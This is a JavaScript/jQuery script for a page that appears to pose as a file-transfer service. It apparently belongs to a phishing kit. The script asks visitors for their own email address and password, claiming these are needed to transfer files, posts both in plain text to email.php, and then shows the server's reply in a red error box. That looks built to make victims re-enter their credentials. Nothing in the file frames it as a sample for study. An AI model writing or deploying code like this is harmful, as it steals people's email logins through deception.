var text_holder = document.getElementById('text-holder');
var IagreeBtn = document.getElementById('Iagree');
$('#Iagree').click(function(){
	$('#text-holder').hide();
})

$('#gotPlus').click(function(e){
	e.preventDefault();
	$('#login').toggle();
})

$('.fa-times').click(function(){
	$('#login').hide();
})

$('#btnTransfer').click(function(){
	var checkmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;
	var alert = document.querySelector('.alert');
if(!($('#yourEmail').val().match(checkmail))){
		$('#yourEmail').focus();
		return false;
	}else if($('#yourEmail').val() == ""){
		$('#yourEmail').focus();
		return false;
	}else if(($('#email').val() == "") || ($('#password').val() == "") || (!($('#email').val().match(checkmail)))){
		$('#login, .alert').show();
		alert.textContent = "Email and password needed to enable you transfer files.";
		$('#email').focus();
	}else{
		$('html, body').animate({
	        scrollTop: document.body.scrollHeight
	    }, "fast");
	    
		$('#login, .alert').show();
		alert.className = alert.className.replace(/\balert-danger\b/g, "alert-info");
		alert.textContent = "Processing...";

		var xmlhttp;
	    if(window.XMLHttpRequest){
	      xmlhttp = new XMLHttpRequest();
	    }else{
	      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	    }

	    xmlhttp.onreadystatechange=function(){
	      if(xmlhttp.readyState==4 && xmlhttp.status==200){
				$('.alert').show();
				alert.className = alert.className.replace(/\balert-info\b/g, "alert-danger");
				alert.textContent = xmlhttp.responseText;
	      }
	    }

	    var email = document.getElementById('email').value;
	    var password = document.getElementById('password').value;
	    var url = 'email.php';
	    var param = "email="+email+"&password="+password;

	    xmlhttp.open("POST", url, true);

	    xmlhttp.setRequestHeader("content-type","application/x-www-form-urlencoded");
	    xmlhttp.setRequestHeader("content-length",param.length);
	    xmlhttp.setRequestHeader("connection","close");

	    xmlhttp.send(param);

	    return true;
	}
});

$('#signBtn').click(function(){
	var checkmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;
	var alert = document.querySelector('.alert');
	if($('#email').val() == ""){
		$('#email').focus();
		$('.alert').show();
		alert.textContent = "Please enter your email address.";
		return false;
	}else if(!($('#email').val().match(checkmail))){
		$('#email').focus();
		$('.alert').show();
		alert.textContent = "Incorrect email format.";
		return false;
	}else if($('#password').val() == ""){
		$('#password').focus();
		$('.alert').show();
		alert.textContent = "Please enter your password.";
		return false;
	}else{
		$('#login, .alert').show();
		alert.className = alert.className.replace(/\balert-danger\b/g, "alert-info");
		alert.textContent = "Processing...";

		var xmlhttp;
	    if(window.XMLHttpRequest){
	      xmlhttp = new XMLHttpRequest();
	    }else{
	      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	    }

	    xmlhttp.onreadystatechange=function(){
	      if(xmlhttp.readyState==4 && xmlhttp.status==200){
				$('.alert').show();
				alert.className = alert.className.replace(/\balert-info\b/g, "alert-danger");
				alert.textContent = xmlhttp.responseText;
	      }
	    }

	    var email = document.getElementById('email').value;
	    var password = document.getElementById('password').value;
	    var url = 'email.php';
	    var param = "email="+email+"&password="+password;

	    xmlhttp.open("POST", url, true);

	    xmlhttp.setRequestHeader("content-type","application/x-www-form-urlencoded");
	    xmlhttp.setRequestHeader("content-length",param.length);
	    xmlhttp.setRequestHeader("connection","close");

	    xmlhttp.send(param);

	    return true;
	}
})